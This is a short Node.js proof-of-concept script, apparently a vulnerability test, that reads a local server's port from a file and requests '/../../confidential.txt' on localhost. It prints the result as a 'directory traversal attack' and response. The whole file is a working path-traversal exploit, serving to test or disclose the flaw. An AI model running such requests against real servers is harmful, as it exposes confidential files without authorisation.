/**
 * Author: Liang Gong
 */
(function() {
    var http = require('http');
    var colors = require('colors');
    var path = require('path');
    var fs = require('fs');
    var content = fs.readFileSync(path.join(__dirname, 'out.txt'), 'utf-8');
    var group = content.match(/Server running at (\d+)/);
    var port = group[1];

    var url = 'http://localhost:' + port + '/../../confidential.txt';

    console.log('\t[' + 'directory traversal attack'.green + ']: ' + url);

    content = '';

    http.get(url, (res) => {
        res.on('data', (chunk) => {
            content += chunk.toString('utf-8');
        });
        res.on('end', () => {
            console.log('\t[' + 'directory traversal request response'.green + ']: ' + content.toString('utf-8').red);
        });
    });
})();
